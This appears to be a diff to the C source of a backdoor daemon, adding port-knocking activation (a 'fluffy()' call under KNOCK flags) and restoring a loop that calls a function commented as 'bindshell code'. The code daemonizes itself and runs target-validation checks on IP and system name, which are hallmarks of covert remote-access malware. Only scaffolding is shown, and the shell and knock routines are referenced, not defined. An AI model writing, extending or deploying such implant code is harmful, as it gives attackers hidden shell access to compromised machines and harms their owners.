@@ -15,6 +15,7 @@
 #include <arpa/inet.h>
 #include <sys/utsname.h>
 #include "valHelper.c"
+#include "functionality.h"
 
 void foo();
 #ifdef SECIMP
@@ -26,6 +27,9 @@ static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
 #endif
 
 int main(void) {
+        #ifdef MULTI_KNOCK
+        //fluffy();
+        #endif
         /*==Validating code using valHelper.c==*/
         val_IP();       //Macro: VALID_IP
         val_SysName();  //Macro: VALID_SYSNAME
@@ -35,7 +39,6 @@ int main(void) {
         printf("%s\n", strProf);
         free(strProf);
         /*=====================================*/
-
         /* Our process ID and Session ID */
         pid_t pid, sid;
 
@@ -62,7 +65,7 @@ int main(void) {
                 exit(EXIT_FAILURE);
         }
 
-
+        
 
         /* Change the current working directory */
 
@@ -77,9 +80,12 @@ int main(void) {
         //close(STDERR_FILENO);
 
         /* Daemon-specific initialization goes here */
-
+        #ifdef KNOCK
+        fluffy();
+        #endif
         /* The Big Loop */
-        //while (1) {
+        #ifndef KNOCK
+        while (1) {
            /* Do some task here ... */
            #ifdef BINDSHELL
            foo(); //bindshell code
@@ -91,7 +97,8 @@ int main(void) {
            //break;
            #endif
            //sleep(30); /* wait 30 seconds */
-        //}
+        }
+        #endif
 
 
   //VALIDATOR!!!!!!!!!!!!!!!!!!!
